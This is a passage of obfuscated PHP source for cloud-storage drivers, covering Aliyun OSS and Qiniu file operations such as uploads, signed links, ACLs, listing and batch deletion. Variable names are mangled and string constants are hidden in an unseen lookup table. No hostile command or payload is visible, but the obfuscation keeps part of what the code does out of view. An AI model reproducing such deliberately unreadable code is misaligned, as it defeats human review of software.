$ÛÚĞ£ =& $_SERVER[ˆûùúÊ¯]; $¿§‡È‰ = $this->fileList($ëÂ…ü‡®, $ÛÚĞ£[12], !0); $Äú×£¨ = array_to_keyvalue($¿§‡È‰[$ÛÚĞ£[93]], $ÛÚĞ£[42]); foreach ($¿§‡È‰[$ÛÚĞ£[92]] as $»øÄ•‹å) { if (is_string($»øÄ•‹å)) { $Äú×£¨[$»øÄ•‹å] = array($ÛÚĞ£[86] => 0); } } return $this->listAllFiles($ëÂ…ü‡®, $Äú×£¨); } public function canRead($ì‚Ğşì¢) { $îû¹èÚœ =& $_SERVER[ˆûùúÊ¯]; $ç°€­É = $this->pathAcl($ì‚Ğşì¢); return $ç°€­É == $îû¹èÚœ[1452] || $ç°€­É == $îû¹èÚœ[595] ? !0 : !1; } public function canWrite($ëæ•›) { $‚ù¤óÒ = $this->pathAcl($ëæ•›); return $‚ù¤óÒ == $_SERVER[ˆûùúÊ¯][595] ? !0 : !1; } public function pathAcl($°”Ÿ²¡Ì) { $½ê¨–ºí =& $_SERVER[ˆûùúÊ¯]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÔÁÚŞÉ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($°”Ÿ²¡Ì)); } catch (OSS\Core\OssException $„Ê÷ç¦€) { return !1; } $…Šï¨  = $ÔÁÚŞÉ == $½ê¨–ºí[47] ? $this->bucketAcl : $ÔÁÚŞÉ; if ($…Šï¨  == $½ê¨–ºí[1453]) { return $½ê¨–ºí[1452]; } if ($…Šï¨  == $½ê¨–ºí[1454]) { return $½ê¨–ºí[595]; } return $…Šï¨ ; } private function chmodPath($ªÍà÷ûÚ, $ãŒö÷â = '') { $ê§ªĞ¹± =& $_SERVER[ˆûùúÊ¯]; $ ²ÖÖïì = empty($ãŒö÷â) ? $ê§ªĞ¹±[1454] : $ãŒö÷â; $ËÔ³—Œ‚ = array($ê§ªĞ¹±[47], $ê§ªĞ¹±[222], $ê§ªĞ¹±[1453], $ê§ªĞ¹±[1454]); if (!in_array($ ²ÖÖïì, $ËÔ³—Œ‚)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ªÍà÷ûÚ), $ ²ÖÖïì); } catch (OSS\Core\OssException $Ş¾ìÆ§é) { return !1; } return !0; } public function getContent($©¥éìûë) { return $this->fileSubstr($©¥éìûë, -1); } public function setContent($•–£ÔÑ¤, $ÆĞ»åòĞ = '') { $ÙçáÚ–¸ =& $_SERVER[ˆûùúÊ¯]; try { $¼ğ‡¡œÖ = $this->trafficLimit($ÙçáÚ–¸[1455]); $ÙˆÉÚÁ© = $this->client->putObject($this->bucket, $this->pathEncode($•–£ÔÑ¤), $ÆĞ»åòĞ, $¼ğ‡¡œÖ); } catch (OSS\Core\OssException $Îş¿Ï–ø) { return !1; } $¸ĞØüú° = array($ÙçáÚ–¸[1445] => trim($ÙˆÉÚÁ©[$ÙçáÚ–¸[1442]], $ÙçáÚ–¸[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($•–£ÔÑ¤))); $this->updateObjMeta($•–£ÔÑ¤, $¸ĞØüú°); return isset($ÙˆÉÚÁ©[$ÙçáÚ–¸[1456]][$ÙçáÚ–¸[283]]) ? !0 : !1; } private function updateObjMeta($Ñ¹›ÇŒ, $›ÏÜŸÁØ) { $Ñ¹›ÇŒ = $this->pathEncode($Ñ¹›ÇŒ); try { $”¹Ú = array(OSS\OssClient::OSS_HEADERS => $›ÏÜŸÁØ); $this->client->copyObject($this->bucket, $Ñ¹›ÇŒ, $this->bucket, $Ñ¹›ÇŒ, $”¹Ú); } catch (OSS\Core\OssException $Æª÷ãƒ) { return !1; } return !0; } public function upload($¤ä¬ÃÂÉ, $öŠ‡öÀ, $¡Ñ–ÃïÅ = false, $ùÚ¼ıÉ = REPEAT_REPLACE) { $è¬Ğş‹Ø =& $_SERVER[ˆûùúÊ¯]; $šëùÂ°  = trim($¤ä¬ÃÂÉ, $è¬Ğş‹Ø[8]); $›ÓÁ•éÔ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($è¬Ğş‹Ø[1445] => @md5_file($öŠ‡öÀ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¤ä¬ÃÂÉ))); $›ÓÁ•éÔ = $this->trafficLimit($è¬Ğş‹Ø[1455], $›ÓÁ•éÔ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($šëùÂ° ), $öŠ‡öÀ, $›ÓÁ•éÔ); } catch (OSS\Core\OssException $Ò½Ìä‹Å) { return !1; } return $this->getPathOuter($¤ä¬ÃÂÉ); } public function getHost() { $±Àñ°ë =& $_SERVER[ˆûùúÊ¯]; $ÎÙó˜×å = explode($±Àñ°ë[207], parent::getHost()); return $ÎÙó˜×å[0] . $±Àñ°ë[207] . $this->bucket . $±Àñ°ë[10] . $ÎÙó˜×å[1]; } public function uploadFormData($‘ÀİÛ¹ , $òË¾›ä = 3600) { $¾Ü‡éÅ =& $_SERVER[ˆûùúÊ¯]; if (!($¥ÕÜ›… = $this->getHost())) { return !1; } $ çÍòüŠ = $òË¾›ä; $–¬¹úÊæ = date($¾Ü‡éÅ[1457], time() + $ çÍòüŠ); $µìÀ‹Óè = new DateTime($–¬¹úÊæ); $ù÷àî‚ = $µìÀ‹Óè->format(DateTime::ISO8601); $¤­”€ÜÇ = strpos($ù÷àî‚, $¾Ü‡éÅ[348]); $ù÷àî‚ = substr($ù÷àî‚, 0, $¤­”€ÜÇ) . $¾Ü‡éÅ[1458]; $–ÍˆÖá¹ = 1048576000 * 5; $¢ô€˜’¤ = $this->pathFather($‘ÀİÛ¹ ); $”®Æà±Ğ = array($¾Ü‡éÅ[266] => $ù÷àî‚, $¾Ü‡éÅ[269] => array(array($¾Ü‡éÅ[1459], 0, $–ÍˆÖá¹), array($¾Ü‡éÅ[272], $¾Ü‡éÅ[273], $¢ô€˜’¤))); $”Î…†Ëµ = base64_encode(json_encode($”®Æà±Ğ)); $ŞäôŸ¦  = base64_encode(hash_hmac($¾Ü‡éÅ[255], $”Î…†Ëµ, $this->secret, !0)); $ŠîˆÚŞ“ = array($¾Ü‡éÅ[284] => $”Î…†Ëµ, $¾Ü‡éÅ[1460] => $this->accessKey, $¾Ü‡éÅ[276] => $¾Ü‡éÅ[265], $¾Ü‡éÅ[1461] => $ŞäôŸ¦ , $¾Ü‡éÅ[205] => $¥ÕÜ›…); $ŠîˆÚŞ“ = $this->trafficLimit($¾Ü‡éÅ[1455], $ŠîˆÚŞ“); return $ŠîˆÚŞ“; } public function multiUploadFormData($†¥””õ¦, $Ÿ´€¯È  = 3600) { $„¢ô±› =& $_SERVER[ˆûùúÊ¯]; if (!($¡ñ°äªÉ = $this->getHost())) { return !1; } $íû’‰€¬ = $this->trafficLimit($„¢ô±›[1455]); $ÔêğÌ˜ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($†¥””õ¦), $íû’‰€¬); return array($„¢ô±›[247] => $ÔêğÌ˜, $„¢ô±›[205] => $¡ñ°äªÉ . $„¢ô±›[8] . $this->pathEncode($†¥””õ¦), $„¢ô±›[248] => gmdate($„¢ô±›[1462]), $„¢ô±›[104] => $†¥””õ¦); } public function multiUploadAuthData($¥ĞÔè˜ê, $àÓ™×ë¥ = array()) { $Íä¹€Õ =& $_SERVER[ˆûùúÊ¯]; $Í¾äÑ„÷ = isset($àÓ™×ë¥[$Íä¹€Õ[248]]) ? $àÓ™×ë¥[$Íä¹€Õ[248]] : gmdate($Íä¹€Õ[1462]); $©†ïÜñ = isset($àÓ™×ë¥[$Íä¹€Õ[184]]) ? $àÓ™×ë¥[$Íä¹€Õ[184]] : $Íä¹€Õ[12]; $ä¢¼Ôó  = $¥ĞÔè˜ê; if (isset($àÓ™×ë¥[$Íä¹€Õ[104]])) { $ä¢¼Ôó  = $àÓ™×ë¥[$Íä¹€Õ[104]]; unset($àÓ™×ë¥[$Íä¹€Õ[104]]); } if (isset($àÓ™×ë¥[$Íä¹€Õ[249]])) { $àÓ™×ë¥[$Íä¹€Õ[248]] = $Í¾äÑ„÷; return $this->listUploadParts($ä¢¼Ôó , $àÓ™×ë¥); } $ÌïÀ²ƒì = array($Íä¹€Õ[250], $Íä¹€Õ[12], $Íä¹€Õ[130], $Í¾äÑ„÷, "\170\x2d\157\163\x73\55\144\x61\164\145\x3a{$Í¾äÑ„÷}", $Íä¹€Õ[8] . $this->bucket . $Íä¹€Õ[8] . $ä¢¼Ôó  . $©†ïÜñ); if (strpos($©†ïÜñ, $Íä¹€Õ[251]) === 0) { $ÌïÀ²ƒì[0] = $Íä¹€Õ[252]; if ($Ö÷¿ğ‘ = $this->trafficLimit($Íä¹€Õ[1455])) { $ä¢¼Ôó  = $Íä¹€Õ[1463]; array_splice($ÌïÀ²ƒì, 5, 0, $ä¢¼Ôó  . $Íä¹€Õ[4] . $Ö÷¿ğ‘[$ä¢¼Ôó ]); } } if (isset($àÓ™×ë¥[$Íä¹€Õ[253]]) && $àÓ™×ë¥[$Íä¹€Õ[253]] == $Íä¹€Õ[254]) { $ÌïÀ²ƒì[0] = $Íä¹€Õ[254]; } if (!empty($àÓ™×ë¥[$Íä¹€Õ[1464]])) { $ÉÒÆãÂš = array_merge(array($ÌïÀ²ƒì[4]), $àÓ™×ë¥[$Íä¹€Õ[1464]]); sort($ÉÒÆãÂš); $ÌïÀ²ƒì[4] = implode($Íä¹€Õ[18], $ÉÒÆãÂš); } $¥ºÚÚª‡ = implode($Íä¹€Õ[18], $ÌïÀ²ƒì); $²Œ“¢è¡ = base64_encode(hash_hmac($Íä¹€Õ[255], $¥ºÚÚª‡, $this->secret, !0)); $äÍîÙ¡± = $Íä¹€Õ[1428] . $this->accessKey . $Íä¹€Õ[4] . $²Œ“¢è¡; if (strpos($©†ïÜñ, $Íä¹€Õ[251]) === 0) { $äÍîÙ¡± = array($Íä¹€Õ[257] => $äÍîÙ¡±, $Íä¹€Õ[248] => $Í¾äÑ„÷); if ($Ö÷¿ğ‘) { $äÍîÙ¡± = array_merge($äÍîÙ¡±, $Ö÷¿ğ‘); } } return $äÍîÙ¡±; } public function listUploadParts($¾†»Û²Š, $ªÔ¸ç¼û) { $×¤Ú‚†… =& $_SERVER[ˆûùúÊ¯]; $ƒÌ†÷¥ = parse_url_query($ªÔ¸ç¼û[$×¤Ú‚†…[184]]); $‹˜ÎÎÅ– = $this->client->listParts($this->bucket, $this->pathEncode($¾†»Û²Š), $ƒÌ†÷¥[$×¤Ú‚†…[247]]); $í’šÉÃ© = $‹˜ÎÎÅ–->getListPart(); $õ‚çß‘ = array(); foreach ($í’šÉÃ© as $ÚøÑš°Œ) { $õ‚çß‘[] = array($×¤Ú‚†…[1449] => $ÚøÑš°Œ->getPartNumber(), $×¤Ú‚†…[1450] => trim($ÚøÑš°Œ->getETag(), $×¤Ú‚†…[128])); } unset($ªÔ¸ç¼û[$×¤Ú‚†…[249]], $ªÔ¸ç¼û[$×¤Ú‚†…[253]]); $ñÃòÒñğ = $this->multiUploadAuthData($¾†»Û²Š, $ªÔ¸ç¼û); if (empty($ñÃòÒñğ)) { return !1; } return array($×¤Ú‚†…[257] => $ñÃòÒñğ, $×¤Ú‚†…[248] => $ªÔ¸ç¼û[$×¤Ú‚†…[248]], $×¤Ú‚†…[259] => $õ‚çß‘); } public function download($ÄÅ¼ŸÂä, $«Ó‚ƒÇ²) { if ($this->isFolder($ÄÅ¼ŸÂä)) { return !1; } try { $¯°Œ÷ş = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $«Ó‚ƒÇ²); $¯°Œ÷ş = $this->trafficLimit($_SERVER[ˆûùúÊ¯][119], $¯°Œ÷ş); $this->client->getObject($this->bucket, $this->pathEncode($ÄÅ¼ŸÂä), $¯°Œ÷ş); } catch (OSS\Core\OssException $öêæ¡ã) { return !1; } return $«Ó‚ƒÇ²; } public function fileSubstr($Õñì‘Òœ, $êê³æá = 0, $½§´ĞÎ£ = false) { if ($êê³æá === -1) { $ƒıÖî–œ = array(); } else { if ($½§´ĞÎ£ === !1) { $€üö…„‡ = $this->size($Õñì‘Òœ); } else { $€üö…„‡ = $êê³æá + $½§´ĞÎ£ - 1; } $ƒıÖî–œ = array(OSS\OssClient::OSS_RANGE => "{$êê³æá}\55{$€üö…„‡}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Õñì‘Òœ), $ƒıÖî–œ); } catch (OSS\Core\OssException $ÂÖ·‹À¹) { think_exception($ÂÖ·‹À¹->getMessage()); return !1; } } private function trafficLimit($Ää¸«…ƒ, $¹—ÖãÄÙ = array()) { $ÜŒ‡€›¢ =& $_SERVER[ˆûùúÊ¯]; if ($Ää¸«…ƒ == $ÜŒ‡€›¢[1455] && $this->isUploadServer() || $Ää¸«…ƒ == $ÜŒ‡€›¢[119] && $this->isFileOutServer()) { return $¹—ÖãÄÙ; } $¥•ûç = floatval($GLOBALS[$ÜŒ‡€›¢[6]][$ÜŒ‡€›¢[99]][$ÜŒ‡€›¢[117]][$Ää¸«…ƒ]) * 1024 * 1024 * 8; if (!$¥•ûç) { return $¹—ÖãÄÙ; } $¥•ûç = $¥•ûç < 819200 ? 819200 : ($¥•ûç > 838860800 ? 838860800 : $¥•ûç); $¹—ÖãÄÙ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¥•ûç); return $¹—ÖãÄÙ; } public function link($°İ÷ú•, $…î³›ó¢ = array()) { $Õ…ü³…­ =& $_SERVER[ˆûùúÊ¯]; if (!$this->exist($°İ÷ú•) || $this->isFolder($°İ÷ú•)) { return !1; } try { $…î³›ó¢ = $this->trafficLimit($Õ…ü³…­[119], $…î³›ó¢); $Ç•±àè = $this->client->signUrl($this->bucket, $this->pathEncode($°İ÷ú•), 3600 * 12, $Õ…ü³…­[254], $…î³›ó¢); return $this->getCdnLink($Ç•±àè); } catch (OSS\Core\OssException $›·©şŠÕ) { return !1; } } public function fileOut($Í³“”ñ», $öì¤ùª‹ = false, $ŸØöæÖé = false, $ÒñäÂ¹ˆ = '') { $û»°¡ =& $_SERVER[ˆûùúÊ¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($Í³“”ñ», $öì¤ùª‹, $ŸØöæÖé, $ÒñäÂ¹ˆ); } if (!$ŸØöæÖé) { $ŸØöæÖé = $this->pathThis($Í³“”ñ»); } $ŸØöæÖé = rawurlencode($ŸØöæÖé); $ñ©øŞê = get_file_mime(get_path_ext($ŸØöæÖé)); if ($ñ©øŞê == $û»°¡[241]) { return parent::fileOut($Í³“”ñ», $öì¤ùª‹, $ŸØöæÖé, $ÒñäÂ¹ˆ); } $öì¤ùª‹ = $öì¤ùª‹ ? $û»°¡[1465] : $û»°¡[1466]; $ë¥«ÓŒö = array(OSS\OssClient::OSS_SUB_RESOURCE => $û»°¡[1467] . rawurlencode("{$öì¤ùª‹}\73\146\x69\154\145\156\x61\x6d\145\75{$ŸØöæÖé}")); $ë¥«ÓŒö[OSS\OssClient::OSS_SUB_RESOURCE] .= $û»°¡[1468] . rawurlencode($ñ©øŞê); $£‚ÖÙù = $this->link($Í³“”ñ», $ë¥«ÓŒö); $this->fileOutLink($£‚ÖÙù); } public function fileOutServer($Ş£î¹Ï, $ïìËÛ¿½ = false, $œöÄ›Ù» = false, $ìã¥´¼¹ = '') { parent::fileOut($Ş£î¹Ï, $ïìËÛ¿½, $œöÄ›Ù», $ìã¥´¼¹); } public function fileOutImage($ôÈ†ÖƒÆ, $‹õ÷¤¦ô = 250) { if ($this->size($ôÈ†ÖƒÆ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ôÈ†ÖƒÆ, $‹õ÷¤¦ô); } $¶´¼Ã©‚ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ˆûùúÊ¯][1469] . $‹õ÷¤¦ô); $ ¦ìÃˆ = $this->link($ôÈ†ÖƒÆ, $¶´¼Ã©‚); $this->fileOutLink($ ¦ìÃˆ); } public function fileOutImageServer($Âşæ¹Âû, $àİ†­İ = 250) { parent::fileOutImage($Âşæ¹Âû, $àİ†­İ); } public function fileOutLink($¢´ø„˜µ) { $½˜»ÍÔ =& $_SERVER[ˆûùúÊ¯]; if (!$this->isCdnHost() && substr($¢´ø„˜µ, 0, 7) == $½˜»ÍÔ[1391]) { $¢´ø„˜µ = $½˜»ÍÔ[1392] . substr($¢´ø„˜µ, 7); } header($½˜»ÍÔ[171] . $¢´ø„˜µ); die; } public function hashMd5($áşİòÛ×, $¿À¶¶òö = '') { $¼‚†­Ïô =& $_SERVER[ˆûùúÊ¯]; $Ï¬•ßî¾ = $this->_objectMeta($áşİòÛ×); if (!$Ï¬•ßî¾) { return $¼‚†­Ïô[12]; } if (!isset($Ï¬•ßî¾[$¼‚†­Ïô[1445]]) && !empty($¿À¶¶òö)) { $×ñäË²² = $this->updateObjMeta($áşİòÛ×, array($¼‚†­Ïô[1445] => $¿À¶¶òö)); $Ï¬•ßî¾[$¼‚†­Ïô[1445]] = $×ñäË²² ? $¿À¶¶òö : $¼‚†­Ïô[12]; } return isset($Ï¬•ßî¾[$¼‚†­Ïô[1445]]) ? strtolower($Ï¬•ßî¾[$¼‚†­Ïô[1445]]) : $¼‚†­Ïô[12]; } public function size($›òËõœÄ) { $¹Òï¸©Ù = $this->objectMeta($›òËõœÄ); return $¹Òï¸©Ù ? $¹Òï¸©Ù[$_SERVER[ˆûùúÊ¯][86]] : 0; } public function info($ßı¿Çü÷) { if ($this->isFolder($ßı¿Çü÷)) { return $this->folderInfo($ßı¿Çü÷); } else { if ($this->isFile($ßı¿Çü÷)) { return $this->fileInfo($ßı¿Çü÷); } } return !1; } public function exist($äŸšÇİ‹) { return $this->isFile($äŸšÇİ‹) || $this->isFolder($äŸšÇİ‹); } public function isFile($ÇÙÄ»û) { return !$this->isFolder($ÇÙÄ»û) && $this->objectMeta($ÇÙÄ»û); } public function isFolder($˜Áø±) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][175], $˜Áø±); } protected function objectMeta($û¯°”æ) { return $this->cacheMethod($_SERVER[ˆûùúÊ¯][177], $û¯°”æ); } protected function _objectMeta($Ÿ‡ÔÏ‘›) { $Š¼áµì› =& $_SERVER[ˆûùúÊ¯]; try { $‘öü„¹« = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Ÿ‡ÔÏ‘›)); } catch (OSS\Core\OssException $†õ’Áî†) { $‘öü„¹« = !1; } if ($‘öü„¹«) { $‘öü„¹«[$Š¼áµì›[86]] = intval($‘öü„¹«[$Š¼áµì›[1443]]); } return $‘öü„¹«; } protected function _isFolder($¸Ó·œà§) { $ÓÖ×å˜Ì =& $_SERVER[ˆûùúÊ¯]; if ($¸Ó·œà§ == $ÓÖ×å˜Ì[12] || $¸Ó·œà§ == $ÓÖ×å˜Ì[8]) { return !0; } $¢ö¸„° = array($ÓÖ×å˜Ì[1438] => $ÓÖ×å˜Ì[8], $ÓÖ×å˜Ì[1439] => rtrim($¸Ó·œà§, $ÓÖ×å˜Ì[8]) . $ÓÖ×å˜Ì[8], $ÓÖ×å˜Ì[1440] => 1, $ÓÖ×å˜Ì[1441] => $ÓÖ×å˜Ì[12]); $ÇïÄĞ´ğ = $this->client->listObjects($this->bucket, $¢ö¸„°); if ($ÇïÄĞ´ğ->getObjectList() || $ÇïÄĞ´ğ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($Õƒ›) { parent::__construct(); require_once SDK_DIR . $_SERVER[ˆûùúÊ¯][1470]; $this->_init($Õƒ›); } public function _init($ìúø¨ÒÆ) { $±ûÃëÙÙ =& $_SERVER[ˆûùúÊ¯]; $this->config = $ìúø¨ÒÆ; foreach ($ìúø¨ÒÆ as $ûÇü÷É¤ => $ßÈƒÈÇ) { if (isset($this->{$ûÇü÷É¤})) { $this->{$ûÇü÷É¤} = $ßÈƒÈÇ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($±ûÃëÙÙ[1471] . LNG($±ûÃëÙÙ[1429])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($§‰âå, $ÄÙö…ùç = '', $¾¤¯Ù = REPEAT_RENAME) { if ($this->setContent($§‰âå, $ÄÙö…ùç)) { return $this->getPathOuter($§‰âå); } return !1; } public function mkdir($´µïàÜ, $¢ÈŒ¶ò½ = REPEAT_SKIP) { $ÌŠ‚Û‘¢ =& $_SERVER[ˆûùúÊ¯]; $Ú²¹àÁó = trim($´µïàÜ, $ÌŠ‚Û‘¢[8]); if ($this->_isFolder($Ú²¹àÁó)) { return $this->getPathOuter($Ú²¹àÁó); } $´µïàÜ = $Ú²¹àÁó . $ÌŠ‚Û‘¢[8]; $´‘À˜Î = get_path_this($Ú²¹àÁó); $Î¡óÄ£œ = $´µïàÜ . $´‘À˜Î; if (!$this->mkfile($Î¡óÄ£œ)) { return !1; } if (!$this->moveFile($Î¡óÄ£œ, $´µïàÜ)) { $this->delFile($Î¡óÄ£œ); return !1; } return $this->getPathOuter($Ú²¹àÁó); } public function copyFile($¤¯°”¸Ó, $ªüÃñáí) { $©üßÓÛş = $this->bucketManager->copy($this->bucket, $¤¯°”¸Ó, $this->bucket, $ªüÃñáí, !0); return $©üßÓÛş ? !1 : $this->getPathOuter($ªüÃñáí); } public function moveFile($Î¡‰Üëê, $¾ë–Ûœ) { $Ö¯®Ç²ó = $this->bucketManager->move($this->bucket, $Î¡‰Üëê, $this->bucket, $¾ë–Ûœ, !0); return $Ö¯®Ç²ó ? !1 : $this->getPathOuter($¾ë–Ûœ); } public function delFile($úÌê¹Õ) { if (!$this->exist($úÌê¹Õ)) { return !0; } $…ÕÀßãÜ = $this->bucketManager->delete($this->bucket, $úÌê¹Õ); return $…ÕÀßãÜ ? !1 : !0; } public function delFolder($¯–Óà‡„) { $â÷¥¾‹€ =& $_SERVER[ˆûùúÊ¯]; if (!$this->exist($¯–Óà‡„)) { return !0; } $this->listItemCache = !1; $šÊÍ™ÖŒ = $this->fileList($¯–Óà‡„); $this->listItemCache = !0; $Õş¦Ìä = trim($¯–Óà‡„, $â÷¥¾‹€[8]) . $â÷¥¾‹€[8]; if (!empty($¯–Óà‡„) && $¯–Óà‡„ !== $â÷¥¾‹€[221] && !in_array($Õş¦Ìä, $šÊÍ™ÖŒ[$â÷¥¾‹€[92]])) { $šÊÍ™ÖŒ[$â÷¥¾‹€[92]][] = $Õş¦Ìä; } $³Ùì“²¦ = $this->delByBatch($šÊÍ™ÖŒ[$â÷¥¾‹€[93]]); if (!$³Ùì“²¦) { return !1; } $³Ùì“²¦ = $this->delByBatch($šÊÍ™ÖŒ[$â÷¥¾‹€[92]]); if (!$³Ùì“²¦) { return !1; } return $this->delFile($Õş¦Ìä); } private function delByBatch($‰òã‡ëÜ) { foreach (array_chunk($‰òã‡ëÜ, 1000) as $©îÈşĞÛ) { $ÀëÊŞ’ = $this->bucketManager->buildBatchDelete($this->bucket, $©îÈşĞÛ); list($±ÚîÔ, $öŞğ²àÍ) = $this->bucketManager->batch($ÀëÊŞ’); if ($öŞğ²àÍ) { return !1; } } return !0; } public function rename($´îíî¸Ş, $éÉƒÃ¿) { return $this->renameObject($´îíî¸Ş, $éÉƒÃ¿); } public function fileInfo($ÏÜÙı©, $ë ïÉŸ = false, $–şòíÙ® = array()) { $É†›¾€Ñ =& $_SERVER[ˆûùúÊ¯]; $¡ˆ»¸ô = array($É†›¾€Ñ[42] => $this->pathThis($ÏÜÙı©), $É†›¾€Ñ[94] => $this->getPathOuter($É†›¾€Ñ[8] . $ÏÜÙı©), $É†›¾€Ñ[43] => $É†›¾€Ñ[223], $É†›¾€Ñ[86] => isset($–şòíÙ®[$É†›¾€Ñ[1472]]) ? $–şòíÙ®[$É†›¾€Ñ[1472]] : 0, $É†›¾€Ñ[184] => $this->ext($ÏÜÙı©)); if ($ë ïÉŸ) { return $¡ˆ»¸ô; } $¡ˆ»¸ô[$É†›¾€Ñ[224]] = $¡ˆ»¸ô[$É†›¾€Ñ[95]] = 0; $¡ˆ»¸ô[$É†›¾€Ñ[225]] = $¡ˆ»¸ô[$É†›¾€Ñ[226]] = !0; if (empty($–şòíÙ®)) { $–şòíÙ® = $this->objectMeta($ÏÜÙı©); if (!$–şòíÙ®) { return $¡ˆ»¸ô; } } if (isset($–şòíÙ®[$É†›¾€Ñ[227]]) && $–şòíÙ®[$É†›¾€Ñ[227]]) { $¡ˆ»¸ô[$É†›¾€Ñ[228]] = $–şòíÙ®[$É†›¾€Ñ[227]]; } if (isset($–şòíÙ®[$É†›¾€Ñ[237]]) && $–şòíÙ®[$É†›¾€Ñ[237]]) { $¡ˆ»¸ô[$É†›¾€Ñ[228]] = $–şòíÙ®[$É†›¾€Ñ[237]]; } if (isset($–şòíÙ®[$É†›¾€Ñ[1473]])) { $¡ˆ»¸ô[$É†›¾€Ñ[95]] = substr($–şòíÙ®[$É†›¾€Ñ[1473]] . $É†›¾€Ñ[12], 0, 10); } if (isset($–şòíÙ®[$É†›¾€Ñ[1472]])) { $¡ˆ»¸ô[$É†›¾€Ñ[86]] = $–şòíÙ®[$É†›¾€Ñ[1472]]; } return $¡ˆ»¸ô; } public function folderInfo($†ªÂªôÉ, $”µ¥ÄÜé = false) { $ãË›€˜ã =& $_SERVER[ˆûùúÊ¯]; $‚ïÖ³œ² = array($ãË›€˜ã[42] => $this->pathThis($†ªÂªôÉ), $ãË›€˜ã[94] => $this->getPathOuter($ãË›€˜ã[8] . $†ªÂªôÉ), $ãË›€˜ã[43] => $ãË›€˜ã[85]); if ($”µ¥ÄÜé) { return $‚ïÖ³œ²; } $‚ïÖ³œ²[$ãË›€˜ã[224]] = $‚ïÖ³œ²[$ãË›€˜ã[95]] = 0; $‚ïÖ³œ²[$ãË›€˜ã[225]] = $‚ïÖ³œ²[$ãË›€˜ã[226]] = !0; $†ªÂªôÉ = rtrim($†ªÂªôÉ, $ãË›€˜ã[8]) . $ãË›€˜ã[8]; $¶Øê¹İ = $this->objectMeta($†ªÂªôÉ); if (isset($¶Øê¹İ[$ãË›€˜ã[1473]])) { $‚ïÖ³œ²[$ãË›€˜ã[95]] = substr($¶Øê¹İ[$ãË›€˜ã[1473]] . $ãË›€˜ã[12], 0, 10); } return $‚ïÖ³œ²; } public function listPath($ú²€©ÏÉ, $Ã’Ñ¤‹£ = false) { $ÂÛğû· =& $_SERVER[ˆûùúÊ¯]; $ÃóŸ¶Í = $this->fileList($ú²€©ÏÉ, $ÂÛğû·[8], !0); foreach ($ÃóŸ¶Í[$ÂÛğû·[92]] as $´ğßáúÔ => $Ë¨ğÌšñ) { $ÃóŸ¶Í[$ÂÛğû·[92]][$´ğßáúÔ] = $this->folderInfo($Ë¨ğÌšñ, $Ã’Ñ¤‹£); } foreach ($ÃóŸ¶Í[$ÂÛğû·[93]] as $´ğßáúÔ => $Ë¨ğÌšñ) { $ÃóŸ¶Í[$ÂÛğû·[93]][$´ğßáúÔ] = $this->fileInfo($Ë¨ğÌšñ[$ÂÛğû·[104]], $Ã’Ñ¤‹£, $Ë¨ğÌšñ); } return $ÃóŸ¶Í; } public function has($İ Ã¼§«, $ª§¡í¶¬ = false, $ˆ·¨­Ê˜ = true) { $¨ ‡ú“° =& $_SERVER[ˆûùúÊ¯]; $İ Ã¼§« = trim($İ Ã¼§«, $¨ ‡ú“°[8]); $Ùï“Çñ = empty($İ Ã¼§«) && $İ Ã¼§« !== $¨ ‡ú“°[221] ? $¨ ‡ú“°[12] : $İ Ã¼§« . $¨ ‡ú“°[8]; $¨Úç¯ï = $¨ ‡ú“°[12]; $ò»ØÄÜ = 500; $ÚèËİÜ½ = $¨ ‡ú“°[8]; $ï÷²¢É» = $¸›Øë” = 0; while (!0) { check_abort(); list($‡×£°¬û, $º»ñü¨œ) = $this->bucketManager->listFiles($this->bucket, $Ùï“Çñ, $¨Úç¯ï, $ò»ØÄÜ, $ÚèËİÜ½); if ($º»ñü¨œ) { break; } $¨Úç¯ï = array_key_exists($¨ ‡ú“°[1441], $‡×£°¬û) ? $¨Úç¯ï = $‡×£°¬û[$¨ ‡ú“°[1474]] : $¨ ‡ú“°[12]; if ($ª§¡í¶¬) { if (!empty($‡×£°¬û[$¨ ‡ú“°[1475]])) { $ï÷²¢É» += count($‡×£°¬û[$¨ ‡ú“°[1475]]); } if (!empty($‡×£°¬û[$¨ ‡ú“°[1476]])) { $¸›Øë” += count($‡×£°¬û[$¨ ‡ú“°[1476]]); } if ($¨Úç¯ï === $¨ ‡ú“°[12]) { break; } continue; } if ($ˆ·¨­Ê˜) { if (!empty($‡×£°¬û[$¨ ‡ú“°[1475]])) { return !0; } } else { if (!empty($‡×£°¬û[$¨ ‡ú“°[1476]])) { return !0; } } if ($¨Úç¯ï === $¨ ‡ú“°[12]) { break; } } if ($ª§¡í¶¬) { return array($¨ ‡ú“°[232] => $ï÷²¢É», $¨ ‡ú“°[233] => $¸›Øë”); } return !1; } public function listAll($ı©‚´è¥) { $Œ­ÁÏÂû =& $_SERVER[ˆûùúÊ¯]; $şŠ†æ‡ = $this->fileList($ı©‚´è¥, $Œ­ÁÏÂû[12], 